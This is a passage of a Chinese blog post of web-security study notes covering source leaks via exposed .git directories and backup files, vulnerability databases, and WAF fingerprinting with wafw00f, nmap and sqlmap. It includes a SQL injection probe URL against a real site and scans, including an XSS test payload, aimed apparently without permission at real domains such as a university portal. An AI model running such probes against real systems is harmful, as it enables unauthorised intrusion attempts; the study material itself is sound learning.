<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/d/web安全/GitHack-master]</span><br><span class="line">└─$ python2 GitHack.py http://192.168.43.44/AtomCMS/.git</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">.gitignore</span><br><span class="line">.htaccess</span><br><span class="line">.idea/.gitignore</span><br><span class="line">.idea/AtomCMS.iml</span><br><span class="line">.idea/modules.xml</span><br><span class="line">.project</span><br><span class="line">CNAME</span><br><span class="line">README.md</span><br><span class="line">admin/ajax/avatar.php</span><br><span class="line">admin/ajax/blur-save.php</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>真就下载到了网站源代码,保存到了<code>GitHack-master/192.168.43.44/</code>下面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS D:\web安全\GitHack-master\192.168.43.44&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\web安全\GitHack-master\192.168.43.44</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----          2022/6/4     20:56                .idea</span><br><span class="line">d-----          2022/6/4     20:56                admin</span><br><span class="line">d-----          2022/6/4     20:56                config</span><br><span class="line">d-----          2022/6/4     20:56                <span class="built_in">functions</span></span><br><span class="line">d-----          2022/6/4     20:56                images</span><br><span class="line">d-----          2022/6/4     20:56                template</span><br><span class="line">d-----          2022/6/4     20:56                uploads</span><br><span class="line">d-----          2022/6/4     20:56                views</span><br><span class="line">d-----          2022/6/4     20:56                widgets</span><br><span class="line">-a----          2022/6/4     21:06             22 .gitignore</span><br><span class="line">-a----          2022/6/4     21:06            162 .htaccess</span><br><span class="line">-a----          2022/6/4     21:06            301 .project</span><br><span class="line">-a----          2022/6/4     21:06             12 CNAME</span><br><span class="line">-a----          2022/6/4     21:06           5048 database-video81.sql</span><br><span class="line">-a----          2022/6/4     21:06           4963 database.sql</span><br><span class="line">-a----          2022/6/4     21:06            176 index.php</span><br><span class="line">-a----          2022/6/4     21:06           9872 README.md</span><br></pre></td></tr></table></figure>

<p>至于GitHack的原理,由于我们有GitHack.py源代码,只要想研究应该可以明白的,但是对于一个python和git都是初学的球,现在不是时候</p>
<h3 id="SVN源码泄漏"><a href="#SVN源码泄漏" class="headerlink" title="SVN源码泄漏"></a>SVN源码泄漏</h3><p>现在都用git仓库了,不会还有人使用SVN吧?</p>
<p>(其实是没学过SVN不会复现该漏洞罢了)</p>
<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604211429182.png" alt="image-20220604211429182"></p>
<p>苹果电脑吗…不想研究</p>
<h3 id="网站备份文件泄漏"><a href="#网站备份文件泄漏" class="headerlink" title="网站备份文件泄漏"></a>网站备份文件泄漏</h3><p>该漏洞需要两个条件</p>
<p>1.存在备份文件,比如.swp,.bak,.zip等类型</p>
<blockquote>
<p>这是有可能的,比如网站升级或者修改的时候,一个有着”好”习惯的管理员都应该备份一下再做修改.但是备份在网站目录下就不对了</p>
</blockquote>
<p>2.网站没有设置好访问权限,导致这些备份文件可以被访问下载</p>
<h4 id="swp文件"><a href="#swp文件" class="headerlink" title="swp文件"></a>swp文件</h4><p>如果后端在linux上,那么有很大机率管理员会使用vim修改文件</p>
<p>当vim修改文件并正常退出(<code>Esc之后:wq</code>)则啥事没有</p>
<p>如果管理员很暴躁,<code>vim</code>打开文件之后直接<code>Ctrl+z</code>中断退出,则会在同一目录下留下<code>.swp</code>文件</p>
<blockquote>
<p>实际上是编辑时产生,正常退出时删除,</p>
<p>ctrl+c导致没有正常退出,没有删除</p>
<p>为啥编辑时要产生这么一个文件呢?</p>
<p>试想如果编辑了一阵子改毁球了,怎么撤销修改退回一开始的版本呢?这就是刚开始编辑时生成的swp文件的作用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/d/phpstudy_pro/www/atomcms]</span><br><span class="line">└─$ <span class="built_in">ls</span> -a -l</span><br><span class="line">total 36</span><br><span class="line">drwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .</span><br><span class="line">drwxrwxrwx 1 kali kali 4096 Apr 26 20:53 ..</span><br><span class="line">...</span><br><span class="line">-rwxrwxrwx 1 kali kali  176 Oct 22  2015 index.php</span><br><span class="line">-rwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .index.php.swo</span><br><span class="line">-rwxrwxrwx 1 kali kali 4096 Jun  4 21:18 .index.php.swp</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里<code>.index.php.swp</code>就是备份文件,<code>.swo</code>是两次暴躁生成 的,下一次再暴躁就有<code>.swn</code>了</p>
<p>诚如是,则在URL中直接访问该<code>.index.php.swp</code>文件就可以看到文件源代码了(意思是该文件会被作为.txt解析)</p>
<p>然鹅我做实验时访问该文件会获得http505状态码</p>
<h4 id="zip文件"><a href="#zip文件" class="headerlink" title="zip文件"></a>zip文件</h4><p>如果在网站目录下面有一个zip文件,那么在URL上访问它是可以直接下载的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604213228081.png" alt="image-20220604213228081"></p>
<p>如果网站管理员又懒又屑,建站的时候直接把压缩包放在根目录下面解压建站,完事儿还忘记删除该压缩包,这就相当于直接把白盒给我们了</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.删除不该有的文件和目录</p>
<p>.git,.svn,.zip,.bak,.DS_Store等等</p>
<p>2.修改web服务器的配置文件,拒绝对.svn,.git路径的访问</p>
<h2 id="目标历史漏洞收集"><a href="#目标历史漏洞收集" class="headerlink" title="目标历史漏洞收集"></a>目标历史漏洞收集</h2><p>收集目标站点的CMS,中间件,数据库,操作系统等组件的类型版本信息,然后去各大漏洞库查询该版本曝光的漏洞</p>
<p>比如阿里云漏洞库</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604223309338.png" alt="image-20220604223309338"></p>
<p>就可以根据别人的漏洞复现进行攻击了</p>
<p>相当于有老师带着做的白盒测试</p>
<h3 id="阿里云漏洞库"><a href="#阿里云漏洞库" class="headerlink" title="阿里云漏洞库"></a><a target="_blank" rel="noopener" href="https://avd.aliyun.com/">阿里云漏洞库</a></h3><p>查询wordpressCMS的所有漏洞</p>
<p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20220604232200215.png" alt="image-20220604232200215"></p>
<h3 id="国家信息安全漏洞库CNNVD"><a href="#国家信息安全漏洞库CNNVD" class="headerlink" title="国家信息安全漏洞库CNNVD"></a><a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/web/vulnerability/queryLds.tag">国家信息安全漏洞库CNNVD</a></h3><h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><p>WAF(web application firewell)web应用防火墙</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604235137919.png" alt="image-20220604235137919"></p>
<p>WAF提供应用层的防护</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605091858083.png" alt="image-20220605091858083"></p>
<h3 id="WAF识别-1"><a href="#WAF识别-1" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>发送不正确的URL访问,触发WAF的防护,根据WAF的相应判断WAF的指纹</p>
<p>常用的WAF识别工具:</p>
<p>wafw00f,nmap,sqlmap</p>
<h4 id="手工方法"><a href="#手工方法" class="headerlink" title="手工方法"></a>手工方法</h4><h5 id="cookie值识别"><a href="#cookie值识别" class="headerlink" title="cookie值识别"></a>cookie值识别</h5><h5 id="HTTP响应头识别"><a href="#HTTP响应头识别" class="headerlink" title="HTTP响应头识别"></a>HTTP响应头识别</h5><h5 id="构造恶意负载"><a href="#构造恶意负载" class="headerlink" title="构造恶意负载"></a>构造恶意负载</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.washun.com/search.php?q=-1%20union%20select%201</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605094155821.png" alt="image-20220605094155821"></p>
<h4 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h4><h4 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# wafw00f http://www.sdtxsn.com/</span><br><span class="line"></span><br><span class="line">                ______</span><br><span class="line">               /      \</span><br><span class="line">              (  W00f! )</span><br><span class="line">               \  ____/</span><br><span class="line">               ,,    __            404 Hack Not Found</span><br><span class="line">           |`-.__   / /                      __     __</span><br><span class="line">           /<span class="string">&quot;  _/  /_/                       \ \   / /</span></span><br><span class="line"><span class="string">          *===*    /                          \ \_/ /  405 Not Allowed</span></span><br><span class="line"><span class="string">         /     )__//                           \   /</span></span><br><span class="line"><span class="string">    /|  /     /---`                        403 Forbidden</span></span><br><span class="line"><span class="string">    \\/`   \ |                                 / _ \</span></span><br><span class="line"><span class="string">    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error</span></span><br><span class="line"><span class="string">      `_____``-`                             /_/   \_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        ~ WAFW00F : v2.1.0 ~</span></span><br><span class="line"><span class="string">        The Web Application Firewall Fingerprinting Toolkit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Checking http://www.sdtxsn.com/</span></span><br><span class="line"><span class="string">[+] Generic Detection results:</span></span><br><span class="line"><span class="string">[-] No WAF detected by the generic detection</span></span><br><span class="line"><span class="string">[~] Number of requests: 7</span></span><br></pre></td></tr></table></figure>

<p>wafw00f没有检测出waf</p>
<h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><p>测试waf是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;目标域名&gt; --script=http-waf-detect.nse </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap www.sdtxsn.com --script=http-waf-detect.nse -p 80</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.sdtxsn.com (121.36.56.23)</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">rDNS record <span class="keyword">for</span> 121.36.56.23: ecs-121-36-56-23.compute.hwclouds-dns.com</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.29 seconds</span><br></pre></td></tr></table></figure>

<p>这里就没有检测到waf存在</p>
<p>拿学校官网试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap ehall.xidian.edu.cn --script=http-waf-detect.nse -p 80</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ehall.xidian.edu.cn (61.150.43.100)</span><br><span class="line">Host is up (0.022s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-waf-detect: IDS/IPS/WAF detected:</span><br><span class="line">|_ehall.xidian.edu.cn:80/?p4yl04d3=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.34 seconds</span><br></pre></td></tr></table></figure>



<p>发现是有防火墙存在的,检测方法是在主页上构造xss攻击负载,结果被拦截</p>
<p>判断waf指纹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;目标域名&gt; --script=http-waf-fingerprint</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap ehall.xidian.edu.cn --script=http-waf-fingerprint -p 80,443</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:37 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> ehall.xidian.edu.cn (61.150.43.100)</span><br><span class="line">Host is up (0.027s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.28 seconds</span><br></pre></td></tr></table></figure>

<p>没有检测出来</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# sqlmap -u http://ehall.xidian.edu.cn/ --batch</span><br><span class="line">...</span><br><span class="line">[09:43:12] [CRITICAL] WAF/IPS identified as <span class="string">&#x27;WTS&#x27;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>







<h2 id="信息收集总结"><a href="#信息收集总结" class="headerlink" title="信息收集总结"></a>信息收集总结</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095016581.png" alt="image-20220605095016581"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095048717.png" alt="image-20220605095048717"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095108752.png" alt="image-20220605095108752"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095126687.png" alt="image-20220605095126687"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605095133730.png" alt="image-20220605095133730"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/8/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/impossible/page/10/">10</a><a class="page-number" href="/impossible/page/11/">11</a><a class="extend next" rel="next" href="/impossible/page/10/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
